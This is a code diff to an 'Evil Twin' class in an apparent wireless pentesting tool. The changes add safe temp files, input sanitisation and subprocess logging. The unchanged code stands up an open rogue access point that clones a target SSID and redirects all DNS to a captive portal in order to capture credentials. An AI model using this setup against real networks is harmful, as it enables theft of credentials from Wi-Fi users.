@@ -15,6 +15,13 @@ import json
 from threading import Thread, Event
 from datetime import datetime
 
+from core.secure_io import (
+    sanitize_hostapd_value,
+    sanitize_iface_name,
+    secure_temp_config,
+)
+
+
 class EvilTwin:
     """Evil Twin attack implementation"""
     
@@ -43,10 +50,16 @@ class EvilTwin:
         self.hostapd_process = None
         self.dnsmasq_process = None
         self.captured_credentials = []
+
+        # Subprocess log handles (closed in stop_attack)
+        self._hostapd_log = None
+        self._dnsmasq_log = None
         
-        # Paths
-        self.hostapd_conf = "/tmp/pendonn_hostapd.conf"
-        self.dnsmasq_conf = "/tmp/pendonn_dnsmasq.conf"
+        # Config paths — created lazily inside the per-process secure temp dir
+        # (0700 dir + 0600 files) so PSKs and AP details aren't world-readable.
+        # Old behavior wrote these to /tmp; CVE-class hazard on multi-user boxes.
+        self.hostapd_conf: str = None
+        self.dnsmasq_conf: str = None
         self.captive_portal_dir = "./web/captive_portal"
         
     def start_attack(self, ssid, bssid, channel, attack_interface, internet_interface=None):
@@ -140,10 +153,25 @@ class EvilTwin:
             # Restore interface
             self._restore_interface()
             
-            # Remove config files
+            # Remove config files (paths may be None if setup never reached them)
             for conf_file in [self.hostapd_conf, self.dnsmasq_conf]:
-                if os.path.exists(conf_file):
-                    os.remove(conf_file)
+                if conf_file and os.path.exists(conf_file):
+                    try:
+                        os.remove(conf_file)
+                    except OSError as e:
+                        self.logger.warning("Could not remove %s: %s", conf_file, e)
+            self.hostapd_conf = None
+            self.dnsmasq_conf = None
+
+            # Close subprocess log file handles
+            for fh in (self._hostapd_log, self._dnsmasq_log):
+                if fh:
+                    try:
+                        fh.close()
+                    except OSError:
+                        pass
+            self._hostapd_log = None
+            self._dnsmasq_log = None
             
             # Restart NetworkManager
             self._start_network_manager()
@@ -204,33 +232,48 @@ class EvilTwin:
             self.logger.warning(f"Could not restore interface: {e}")
     
     def _setup_hostapd(self):
-        """Create hostapd configuration"""
-        config_content = f"""
+        """Create hostapd configuration in a 0600 file inside the secure temp dir.
+
+        SSID, interface, and channel are validated/sanitized before being
+        embedded — a crafted SSID containing a newline could otherwise inject
+        arbitrary hostapd directives (e.g. wpa=2 / wpa_passphrase=...).
+        """
+        safe_iface = sanitize_iface_name(self.attack_interface)
+        safe_ssid = sanitize_hostapd_value(self.target_ssid, max_len=32, field="ssid")
+        # Channel is an int per 802.11; coerce + range-check so a string can't
+        # smuggle in extra config lines.
+        try:
+            safe_channel = int(self.target_channel)
+        except (TypeError, ValueError):
+            raise ValueError(f"target_channel must be int, got {self.target_channel!r}")
+        if not (1 <= safe_channel <= 196):
+            raise ValueError(f"target_channel out of range: {safe_channel}")
+
+        config_content = f"""\
 # PenDonn Evil Twin - hostapd configuration
-interface={self.attack_interface}
+interface={safe_iface}
 driver=nl80211
-ssid={self.target_ssid}
-channel={self.target_channel}
+ssid={safe_ssid}
+channel={safe_channel}
 hw_mode=g
 
 # Open network (no encryption) to capture credentials
 auth_algs=1
 wpa=0
-
-# MAC address (optional - can spoof target BSSID)
-# bssid={self.target_bssid}
 """
-        
-        with open(self.hostapd_conf, 'w') as f:
+
+        self.hostapd_conf = secure_temp_config("hostapd")
+        with open(self.hostapd_conf, "w") as f:
             f.write(config_content)
-        
-        self.logger.info("Created hostapd configuration")
+
+        self.logger.info("Created hostapd configuration at %s", self.hostapd_conf)
     
     def _setup_dnsmasq(self):
-        """Create dnsmasq configuration"""
-        config_content = f"""
+        """Create dnsmasq configuration in a 0600 file inside the secure temp dir."""
+        safe_iface = sanitize_iface_name(self.attack_interface)
+        config_content = f"""\
 # PenDonn Evil Twin - dnsmasq configuration
-interface={self.attack_interface}
+interface={safe_iface}
 dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
 dhcp-option=3,10.0.0.1
 dhcp-option=6,10.0.0.1
@@ -241,45 +284,58 @@ log-dhcp
 # Redirect all DNS queries to captive portal
 address=/#/10.0.0.1
 """
-        
-        with open(self.dnsmasq_conf, 'w') as f:
+
+        self.dnsmasq_conf = secure_temp_config("dnsmasq")
+        with open(self.dnsmasq_conf, "w") as f:
             f.write(config_content)
-        
-        self.logger.info("Created dnsmasq configuration")
+
+        self.logger.info("Created dnsmasq configuration at %s", self.dnsmasq_conf)
     
+    def _open_subprocess_log(self, name: str):
+        """Return a writable log file under ./logs/ for a long-running daemon.
+
+        We don't use stdout=PIPE/stderr=PIPE on these because nothing reads
+        the pipes — the kernel buffer fills (~64KB) and the daemon hangs.
+        Routing to a real file gives us debuggable output without the deadlock.
+        """
+        os.makedirs("./logs", exist_ok=True)
+        return open(f"./logs/evil_twin_{name}.log", "ab", buffering=0)
+
     def _start_hostapd(self):
         """Start hostapd process"""
         try:
+            self._hostapd_log = self._open_subprocess_log("hostapd")
             self.hostapd_process = subprocess.Popen(
                 ["hostapd", self.hostapd_conf],
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE
+                stdout=self._hostapd_log,
+                stderr=subprocess.STDOUT,
             )
             time.sleep(2)  # Wait for hostapd to start
-            
+
             if self.hostapd_process.poll() is not None:
-                raise Exception("hostapd failed to start")
-            
-            self.logger.info("Started hostapd")
-            
+                raise Exception("hostapd failed to start (see ./logs/evil_twin_hostapd.log)")
+
+            self.logger.info("Started hostapd (logs -> ./logs/evil_twin_hostapd.log)")
+
         except Exception as e:
             raise Exception(f"Failed to start hostapd: {e}")
-    
+
     def _start_dnsmasq(self):
         """Start dnsmasq process"""
         try:
+            self._dnsmasq_log = self._open_subprocess_log("dnsmasq")
             self.dnsmasq_process = subprocess.Popen(
                 ["dnsmasq", "-C", self.dnsmasq_conf, "-d"],
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE
+                stdout=self._dnsmasq_log,
+                stderr=subprocess.STDOUT,
             )
             time.sleep(1)  # Wait for dnsmasq to start
-            
+
             if self.dnsmasq_process.poll() is not None:
-                raise Exception("dnsmasq failed to start")
-            
-            self.logger.info("Started dnsmasq")
-            
+                raise Exception("dnsmasq failed to start (see ./logs/evil_twin_dnsmasq.log)")
+
+            self.logger.info("Started dnsmasq (logs -> ./logs/evil_twin_dnsmasq.log)")
+
         except Exception as e:
             raise Exception(f"Failed to start dnsmasq: {e}")
     
